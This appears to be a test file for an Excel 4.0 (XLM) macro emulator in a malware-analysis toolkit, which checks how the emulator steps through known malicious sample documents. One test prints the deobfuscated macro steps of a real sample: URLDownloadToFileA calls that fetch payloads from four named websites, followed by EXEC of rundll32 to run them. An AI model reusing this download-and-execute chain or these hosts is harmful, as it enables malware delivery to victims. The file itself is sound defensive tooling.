"""
The emulator end to end: every run of every XLM sample of the test data store and of the XLSB
maldoc finishes inside its budget, the statuses a run leaves its cells are pinned, and the
output levels show exactly the steps their severity promises.
"""
from __future__ import annotations

from refinery.lib.scripts.xlm import XlmEngine, XlmView, visible_steps
from refinery.lib.scripts.xlm.trace import XlmStatus
from test import TestBase
from test.lib.excel.samples import (
    XLM_MACRO_ASSIGN_BIFF8,
    XLM_MACRO_FORMULA_XLSM,
    XLM_MACRO_NAMES_BIFF8,
    XLM_MACRO_RPN_BIFF8,
    XLM_MACRO_TEXT_XLSM,
)

_MALDOC = 'dc44bbfc845fc078cf38b9a3543a32ae1742be8c6320b81cf6cd5a8cee3c696a'

_SAMPLES = [
    ('rpn', XLM_MACRO_RPN_BIFF8),
    ('names', XLM_MACRO_NAMES_BIFF8),
    ('assign', XLM_MACRO_ASSIGN_BIFF8),
    ('text', XLM_MACRO_TEXT_XLSM),
    ('formula', XLM_MACRO_FORMULA_XLSM),
]


class TestEmulator(TestBase):

    @staticmethod
    def _steps(data: bytes | bytearray) -> list:
        return list(XlmEngine(XlmView(data)).run())

    def test_every_sample_finishes_its_run_inside_the_budget(self):
        for name, key in _SAMPLES:
            with self.subTest(sample=name):
                steps = self._steps(self.download_sample(key))
                self.assertNotEqual(steps, [])
                self.assertLess(len(steps), 1_000_000)
                self.assertEqual(
                    [
                        step.status
                        for step in steps
                        if step.status is XlmStatus.Error
                    ],
                    [],
                )

    def test_the_last_step_of_every_run_is_pinned(self):
        for name, key, sheet, row, col, status in [
            ('rpn', XLM_MACRO_RPN_BIFF8, 'mP9mScF1m5', 10, 20, XlmStatus.End),
            ('names', XLM_MACRO_NAMES_BIFF8, 'Acf444', 9591, 1, XlmStatus.PartialEvaluation),
            ('assign', XLM_MACRO_ASSIGN_BIFF8, 'sod', 25282, 148, XlmStatus.End),
            ('text', XLM_MACRO_TEXT_XLSM, 'Doc1', 114, 62, XlmStatus.End),
            ('formula', XLM_MACRO_FORMULA_XLSM, 'PCWV', 34, 7, XlmStatus.FullEvaluation),
            ('maldoc', _MALDOC, 'Tiposa1', 30, 7, XlmStatus.FullEvaluation),
        ]:
            with self.subTest(sample=name):
                steps = self._steps(self.download_sample(key))
                self.assertEqual(
                    (steps[-1].sheet, steps[-1].row, steps[-1].col, steps[-1].status),
                    (sheet, row, col, status),
                )

    def test_the_statuses_of_every_run_are_pinned(self):
        for name, key, expected in [
            ('rpn', XLM_MACRO_RPN_BIFF8, ['End', 'FullEvaluation', 'PartialEvaluation']),
            ('names', XLM_MACRO_NAMES_BIFF8, ['PartialEvaluation']),
            ('assign', XLM_MACRO_ASSIGN_BIFF8, [
                'End', 'FullBranching', 'FullEvaluation', 'PartialEvaluation',
            ]),
            ('text', XLM_MACRO_TEXT_XLSM, ['End', 'FullEvaluation', 'PartialEvaluation']),
            ('formula', XLM_MACRO_FORMULA_XLSM, ['FullEvaluation', 'PartialEvaluation']),
            ('maldoc', _MALDOC, ['FullEvaluation', 'PartialEvaluation']),
        ]:
            with self.subTest(sample=name):
                steps = self._steps(self.download_sample(key))
                self.assertEqual(
                    sorted({step.status for step in steps}, key=lambda status: status.name),
                    [XlmStatus[status] for status in expected],
                )

    def test_every_output_level_shows_the_steps_its_severity_promises(self):
        for name, key, counts in [
            ('rpn', XLM_MACRO_RPN_BIFF8, [20, 19, 8]),
            ('names', XLM_MACRO_NAMES_BIFF8, [1, 1, 1]),
            ('assign', XLM_MACRO_ASSIGN_BIFF8, [141, 86, 8]),
            ('text', XLM_MACRO_TEXT_XLSM, [16, 16, 10]),
            ('formula', XLM_MACRO_FORMULA_XLSM, [10, 10, 9]),
            ('maldoc', _MALDOC, [27, 6, 4]),
        ]:
            with self.subTest(sample=name):
                steps = self._steps(self.download_sample(key))
                self.assertEqual(
                    [len(list(visible_steps(steps, level))) for level in range(3)],
                    counts,
                )

    def test_the_first_level_hides_the_moves_and_the_cells_that_are_no_command(self):
        steps = self._steps(self.download_sample(XLM_MACRO_TEXT_XLSM))
        self.assertEqual(
            [(step.sheet, step.row, step.col) for step in visible_steps(steps, 1)],
            [
                ('Doc1', 109, 52),
                ('Doc1', 110, 52),
                ('Doc1', 118, 52),
                ('Doc1', 120, 52),
                ('Doc1', 121, 52),
                ('Doc1', 93, 56),
                ('Doc1', 95, 56),
                ('Doc1', 97, 56),
                ('Doc1', 99, 56),
                ('Doc1', 104, 56),
                ('Doc1', 109, 58),
                ('Doc1', 110, 58),
                ('Doc1', 111, 58),
                ('Doc1', 112, 58),
                ('Doc1', 113, 58),
                ('Doc1', 114, 62),
            ],
        )
        self.assertEqual(
            [step.text for step in visible_steps(steps, 1)],
            [
                'SET.VALUE(BD108,"URLMo")',
                'SET.VALUE(BD109,"URLDownloadToFile")',
                'SET.VALUE(BD119,"JJCCBB")',
                'SET.VALUE(Doc1!BD121,"rundll3")',
                'Doc1!BD91()',
                'CALL("URLMon","URLDownloadToFileA","JJCCBB",0,'
                '"https://maharaniworld.com/ds/3103.gif","..\\iekdhfe.dsk1",0,0)',
                'CALL("URLMon","URLDownloadToFileA","JJCCBB",0,'
                '"https://aycconsultoriaempresarial.com/ds/3103.gif","..\\iekdhfe.dsk2",0,0)',
                'CALL("URLMon","URLDownloadToFileA","JJCCBB",0,'
                '"https://sgb.ac.ke/ds/3103.gif","..\\iekdhfe.dsk3",0,0)',
                'CALL("URLMon","URLDownloadToFileA","JJCCBB",0,'
                '"https://hashmati.com/ds/3103.gif","..\\iekdhfe.dsk4",0,0)',
                'Doc1!BF109()',
                '=EXEC("rundll32 ..\\iekdhfe.dsk,DllRegisterServer")',
                '=EXEC("rundll32 ..\\iekdhfe.dsk1,DllRegisterServer")',
                '=EXEC("rundll32 ..\\iekdhfe.dsk2,DllRegisterServer")',
                '=EXEC("rundll32 ..\\iekdhfe.dsk3,DllRegisterServer")',
                '=EXEC("rundll32 ..\\iekdhfe.dsk4,DllRegisterServer")=Doc1!BJ114()',
                'HALT()',
            ],
        )

    def test_the_second_level_hides_every_ordinary_command(self):
        steps = self._steps(self.download_sample(XLM_MACRO_RPN_BIFF8))
        self.assertEqual(
            [(step.sheet, step.row, step.col) for step in visible_steps(steps, 2)],
            [
                ('mP9mScF1m5', 1, 20),
                ('mP9mScF1m5', 3, 20),
                ('mP9mScF1m5', 4, 20),
                ('mP9mScF1m5', 5, 20),
                ('mP9mScF1m5', 6, 20),
                ('mP9mScF1m5', 7, 20),
                ('mP9mScF1m5', 9, 20),
                ('mP9mScF1m5', 10, 20),
            ],
        )
